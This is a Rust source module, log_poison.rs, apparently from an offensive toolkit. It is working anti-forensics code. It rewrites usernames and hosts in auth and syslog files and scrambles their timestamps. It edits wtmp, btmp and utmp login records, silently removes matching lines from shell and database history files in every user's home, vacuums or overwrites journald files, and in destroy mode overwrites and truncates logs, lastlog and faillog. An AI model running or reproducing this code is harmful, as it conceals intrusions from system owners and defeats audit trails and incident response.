/*
 * log_poison.rs — Log sanitization and misdirection
 *
 * COVER: replace sensitive strings in text logs (in-place, fixed-width),
 *        rewrite utmp/wtmp binary records, drop shell history lines.
 * DESTROY: random overwrite + truncate.
 */

use std::fs::{self, File, OpenOptions};
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom, Write};
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

use glob::glob;

use crate::{fill_random, Result};

// ── Options ───────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum LogpMode {
    Cover,
    Destroy,
}

#[derive(Debug, Clone)]
pub struct LogpReplace {
    pub needle: String,
    pub replacement: String,
}

pub struct LogpOpts {
    pub mode: LogpMode,
    pub replacements: Vec<LogpReplace>,
    pub scramble_ts: bool,
    pub ts_window_start: i64,
    pub ts_window_end: i64,
    pub do_auth_log: bool,
    pub do_syslog: bool,
    pub do_wtmp: bool,
    pub do_bash_history: bool,
    pub do_journal: bool,
    pub extra_logs: Vec<String>,
    pub verbose: bool,
}

#[derive(Debug, Default)]
pub struct LogpStats {
    pub files_processed: u64,
    pub lines_replaced: u64,
    pub bytes_wiped: u64,
    pub errors: u64,
}

// ── Destroy a file ────────────────────────────────────────────────────────────

fn destroy_file(path: &str, stats: &mut LogpStats) -> Result<()> {
    let meta = match fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => {
            stats.errors += 1;
            return Err(e.to_string());
        }
    };

    let size = meta.len();
    let mut f = OpenOptions::new().write(true).open(path).map_err(|e| {
        stats.errors += 1;
        e.to_string()
    })?;

    // Random overwrite
    if size > 0 {
        let mut buf = [0u8; 4096];
        let mut written = 0u64;
        while written < size {
            let chunk = (size - written).min(4096) as usize;
            fill_random(&mut buf[..chunk]);
            if f.write_all(&buf[..chunk]).is_err() {
                break;
            }
            written += chunk as u64;
        }
        let _ = f.flush();
    }

    // Truncate
    let _ = f.set_len(0);
    let _ = f.flush();

    stats.files_processed += 1;
    stats.bytes_wiped += size;
    Ok(())
}

// ── In-place string replacement (fixed-width) ─────────────────────────────────

fn replace_inplace(line: &mut [u8], needle: &[u8], replacement: &[u8]) -> usize {
    let nlen = needle.len();
    if nlen == 0 {
        return 0;
    }
    let mut count = 0;
    let mut i = 0;
    while i + nlen <= line.len() {
        if &line[i..i + nlen] == needle {
            let rlen = replacement.len();
            let copy = rlen.min(nlen);
            line[i..i + copy].copy_from_slice(&replacement[..copy]);
            if copy < nlen {
                line[i + copy..i + nlen].fill(b' ');
            }
            i += nlen;
            count += 1;
        } else {
            i += 1;
        }
    }
    count
}

// ── Syslog timestamp scramble ─────────────────────────────────────────────────

fn scramble_syslog_ts(line: &mut [u8], ts_start: i64, ts_end: i64) {
    if line.len() < 16 {
        return;
    }
    if !line[0].is_ascii_uppercase() {
        return;
    }

    let range = (ts_end - ts_start).max(1) as u32;
    let t = ts_start + (crate::rand_u32() % range) as i64;

    let tm = unsafe {
        let mut tm: libc::tm = std::mem::zeroed();
        libc::localtime_r(&t, &mut tm);
        tm
    };

    static MONTHS: [&str; 12] = [
        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
    ];

    let mon = tm.tm_mon as usize;
    if mon >= 12 {
        return;
    }

    let ts = format!(
        "{} {:2} {:02}:{:02}:{:02} ",
        MONTHS[mon], tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec
    );

    // Exactly 16 chars — overwrite in-place
    let ts_bytes = ts.as_bytes();
    if ts_bytes.len() == 16 {
        line[..16].copy_from_slice(ts_bytes);
    }
}

// ── Text log processing ───────────────────────────────────────────────────────

pub fn logp_text_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    if opts.mode == LogpMode::Destroy {
        return destroy_file(path, stats);
    }

    let f = match File::open(path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => {
            stats.errors += 1;
            return Err(e.to_string());
        }
    };

    let tmp_path = format!("{}.s2tmp", path);
    let mut out = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(&tmp_path)
        .map_err(|e| {
            stats.errors += 1;
            e.to_string()
        })?;

    let reader = BufReader::new(f);
    let mut line_repl = 0u64;

    for line in reader.split(b'\n') {
        let line = line.map_err(|e| e.to_string())?;
        let mut buf = line.clone();
        buf.push(b'\n');

        let mut hit = false;
        for rep in &opts.replacements {
            let n = replace_inplace(&mut buf, rep.needle.as_bytes(), rep.replacement.as_bytes());
            if n > 0 {
                hit = true;
                line_repl += n as u64;
            }
        }

        if hit && opts.scramble_ts && opts.ts_window_start > 0 {
            scramble_syslog_ts(&mut buf, opts.ts_window_start, opts.ts_window_end);
        }

        out.write_all(&buf).map_err(|e| e.to_string())?;
    }

    // Preserve permissions
    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(
            &tmp_path,
            fs::Permissions::from_mode(meta.permissions().mode()),
        );
    }

    drop(out);
    fs::rename(&tmp_path, path).map_err(|e| {
        let _ = fs::remove_file(&tmp_path);
        e.to_string()
    })?;

    stats.files_processed += 1;
    stats.lines_replaced += line_repl;
    Ok(())
}

// ── wtmp / btmp / utmp ────────────────────────────────────────────────────────

// struct utmp layout on Linux x86-64: 384 bytes
// ut_type (i16, 0), pad (2), ut_pid (i32, 4)
// ut_line (32 bytes, 8), ut_id (4 bytes, 40), ut_user (32 bytes, 44)
// ut_host (256 bytes, 76), ...
// We access fields by known offsets rather than depending on libc::utmp layout.

const UTMP_RECORD_SIZE: usize = 384;
const UTMP_OFF_USER: usize = 44;
const UTMP_OFF_HOST: usize = 76;
const UTMP_OFF_LINE: usize = 8;
const UTMP_FIELD_USER: usize = 32;
const UTMP_FIELD_HOST: usize = 256;
const UTMP_FIELD_LINE: usize = 32;

fn contains_needle(field: &[u8], needle: &[u8]) -> bool {
    field.windows(needle.len()).any(|w| w == needle)
}

fn overwrite_field(rec: &mut [u8], offset: usize, len: usize, replacement: &[u8]) {
    let field = &mut rec[offset..offset + len];
    field.fill(0);
    let copy = replacement.len().min(len);
    field[..copy].copy_from_slice(&replacement[..copy]);
}

pub fn logp_wtmp_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    if opts.mode == LogpMode::Destroy {
        return destroy_file(path, stats);
    }

    let mut f = match OpenOptions::new().read(true).write(true).open(path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => {
            stats.errors += 1;
            return Err(e.to_string());
        }
    };

    let mut rec = [0u8; UTMP_RECORD_SIZE];
    let mut modified = 0u64;
    let mut offset = 0u64;

    loop {
        f.seek(SeekFrom::Start(offset)).map_err(|e| e.to_string())?;
        match f.read_exact(&mut rec) {
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::UnexpectedEof => break,
            Err(e) => {
                stats.errors += 1;
                return Err(e.to_string());
            }
        }

        let mut hit = false;
        for rep in &opts.replacements {
            let needle = rep.needle.as_bytes();
            let replacement = rep.replacement.as_bytes();

            if contains_needle(&rec[UTMP_OFF_USER..UTMP_OFF_USER + UTMP_FIELD_USER], needle) {
                overwrite_field(&mut rec, UTMP_OFF_USER, UTMP_FIELD_USER, replacement);
                hit = true;
            }
            if contains_needle(&rec[UTMP_OFF_HOST..UTMP_OFF_HOST + UTMP_FIELD_HOST], needle) {
                overwrite_field(&mut rec, UTMP_OFF_HOST, UTMP_FIELD_HOST, replacement);
                hit = true;
            }
            if contains_needle(&rec[UTMP_OFF_LINE..UTMP_OFF_LINE + UTMP_FIELD_LINE], needle) {
                overwrite_field(&mut rec, UTMP_OFF_LINE, UTMP_FIELD_LINE, replacement);
                hit = true;
            }
        }

        if hit {
            f.seek(SeekFrom::Start(offset)).map_err(|e| e.to_string())?;
            f.write_all(&rec).map_err(|e| e.to_string())?;
            modified += 1;
        }

        offset += UTMP_RECORD_SIZE as u64;
    }

    let _ = f.flush();
    stats.files_processed += 1;
    stats.lines_replaced += modified;
    Ok(())
}

// ── Shell history ─────────────────────────────────────────────────────────────

fn process_history_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    if opts.mode == LogpMode::Destroy {
        return destroy_file(path, stats);
    }

    let f = match File::open(path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e.to_string()),
    };

    let tmp_path = format!("{}.s2tmp", path);
    let mut out = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(&tmp_path)
        .map_err(|e| e.to_string())?;

    let mut removed = 0u64;

    for line in BufReader::new(f).lines() {
        let line = line.map_err(|e| e.to_string())?;

        // zsh extended history: ": <ts>:<el>;<cmd>"
        let cmd = if line.starts_with(": ") {
            line.find(';').map(|i| &line[i + 1..]).unwrap_or(&line)
        } else {
            &line
        };

        let drop = opts.replacements.iter().any(|r| cmd.contains(&r.needle));

        if drop {
            removed += 1;
        } else {
            writeln!(out, "{}", line).map_err(|e| e.to_string())?;
        }
    }

    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(
            &tmp_path,
            fs::Permissions::from_mode(meta.permissions().mode()),
        );
    }

    drop(out);
    fs::rename(&tmp_path, path).map_err(|e| {
        let _ = fs::remove_file(&tmp_path);
        e.to_string()
    })?;

    stats.files_processed += 1;
    stats.lines_replaced += removed;
    Ok(())
}

const HISTORY_FILES: &[&str] = &[
    ".bash_history",
    ".zsh_history",
    ".local/share/fish/fish_history",
    ".sh_history",
    ".ksh_history",
    ".python_history",
    ".mysql_history",
    ".psql_history",
    ".lesshst",
    ".viminfo",
];

fn process_history_for_home(home: &str, opts: &LogpOpts, stats: &mut LogpStats) {
    if let Ok(hf) = std::env::var("HISTFILE") {
        if !hf.is_empty() {
            let _ = process_history_file(&hf, opts, stats);
        }
    }
    for name in HISTORY_FILES {
        let path = format!("{}/{}", home, name);
        let _ = process_history_file(&path, opts, stats);
    }
}

pub fn logp_bash_history(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    // Always process the current user's home
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    process_history_for_home(&home, opts, stats);

    // If root: sweep all user home directories
    if unsafe { libc::getuid() } == 0 {
        process_history_for_home("/root", opts, stats);
        if let Ok(entries) = std::fs::read_dir("/home") {
            for entry in entries.flatten() {
                let h = entry.path();
                if h.is_dir() {
                    if let Some(hs) = h.to_str() {
                        process_history_for_home(hs, opts, stats);
                    }
                }
            }
        }
    }

    Ok(())
}

// ── journald ──────────────────────────────────────────────────────────────────

fn run_journalctl(arg: &str) -> bool {
    Command::new("journalctl")
        .arg(arg)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn destroy_journal_files(stats: &mut LogpStats) {
    for dir in &["/run/log/journal", "/var/log/journal"] {
        let pattern = format!("{}/**/*.journal", dir);
        if let Ok(entries) = glob(&pattern) {
            for entry in entries.flatten() {
                if let Some(p) = entry.to_str() {
                    let _ = destroy_file(p, stats);
                }
            }
        }
    }
    eprintln!(
        "[+] journal: {} .journal file(s) overwritten",
        stats.files_processed
    );
}

pub fn logp_journal(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    if opts.mode == LogpMode::Cover {
        eprintln!("[*] journal: rotating and vacuuming via journalctl");
        let ok = run_journalctl("--rotate") && run_journalctl("--vacuum-time=1s");
        if ok {
            stats.files_processed += 1;
            return Ok(());
        }
        eprintln!("[!] journalctl failed, falling back to direct overwrite");
    }
    destroy_journal_files(stats);
    Ok(())
}

// ── Entry point ───────────────────────────────────────────────────────────────

pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
    if opts.verbose {
        eprintln!("[*] log_poison: mode={:?}", opts.mode);
    }

    if opts.do_auth_log {
        for p in &[
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/auth.log.1",
        ] {
            if std::path::Path::new(p).exists() {
                if opts.verbose {
                    eprintln!("[*] {}", p);
                }
                let _ = logp_text_file(p, opts, stats);
            }
        }
        if opts.mode == LogpMode::Destroy {
            for pattern in &["/var/log/auth.log.*.gz", "/var/log/secure-*.gz"] {
                if let Ok(entries) = glob(pattern) {
                    for e in entries.flatten() {
                        if let Some(p) = e.to_str() {
                            let _ = destroy_file(p, stats);
                        }
                    }
                }
            }
        }
    }

    if opts.do_syslog {
        for p in &[
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/syslog.1",
            "/var/log/kern.log",
        ] {
            if std::path::Path::new(p).exists() {
                if opts.verbose {
                    eprintln!("[*] {}", p);
                }
                let _ = logp_text_file(p, opts, stats);
            }
        }
        if opts.mode == LogpMode::Destroy {
            if let Ok(entries) = glob("/var/log/syslog.*.gz") {
                for e in entries.flatten() {
                    if let Some(p) = e.to_str() {
                        let _ = destroy_file(p, stats);
                    }
                }
            }
        }
    }

    if opts.do_wtmp {
        for p in &["/var/log/wtmp", "/var/log/btmp", "/var/run/utmp"] {
            if std::path::Path::new(p).exists() {
                if opts.verbose {
                    eprintln!("[*] {}", p);
                }
                let _ = logp_wtmp_file(p, opts, stats);
            }
        }
        // lastlog: fixed-width binary (per-uid records), destroy only
        // faillog: same format, tracks failed logins per uid
        for p in &["/var/log/lastlog", "/var/log/faillog"] {
            if opts.mode == LogpMode::Destroy && std::path::Path::new(p).exists() {
                let _ = destroy_file(p, stats);
            }
        }
    }

    if opts.do_bash_history {
        logp_bash_history(opts, stats)?;
    }

    if opts.do_journal {
        logp_journal(opts, stats)?;
    }

    for extra in &opts.extra_logs {
        if opts.verbose {
            eprintln!("[*] extra: {}", extra);
        }
        let _ = logp_text_file(extra, opts, stats);
    }

    eprintln!(
        "[+] log_poison: {} file(s), {} line(s), {} MiB, {} error(s)",
        stats.files_processed,
        stats.lines_replaced,
        stats.bytes_wiped >> 20,
        stats.errors
    );
    Ok(())
}
